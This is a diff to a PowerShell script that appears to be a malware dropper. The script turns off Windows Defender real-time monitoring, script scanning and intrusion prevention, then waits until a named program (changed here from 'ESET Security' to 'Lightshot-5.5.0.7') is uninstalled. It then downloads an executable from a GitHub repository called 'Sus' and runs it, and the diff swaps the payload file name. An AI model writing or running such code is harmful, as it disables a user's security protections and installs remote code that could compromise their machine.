@@ -2,7 +2,7 @@ $appdata = [Environment]::GetFolderPath("ApplicationData");
 cd $appdata
 
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode
-$filterSpec = "ESET Security"
+$filterSpec = "Lightshot-5.5.0.7"
 $hives = @("HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
 $hives |% {
   $keys = gci $_ -Recurse
@@ -15,11 +15,11 @@ $hives |% {
   }
 }
 while($true){
-    $software = "ESET Security";
+    $software = "Lightshot-5.5.0.7";
     $installed = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where { $_.DisplayName -eq $software }) -ne $null
 
     If(-Not $installed) {
-        wget https://github.com/Squatch55/Sus/raw/master/59684/Dont/chromium-alpha.exe -OutFile chromium-alpha.exe; start-process chromium-alpha.exe
+        wget https://github.com/Squatch55/Sus/raw/master/59684/Dont/testbuilt.exe -OutFile testbuilt.exe; start-process testbuilt.exe
         break
     }
 }
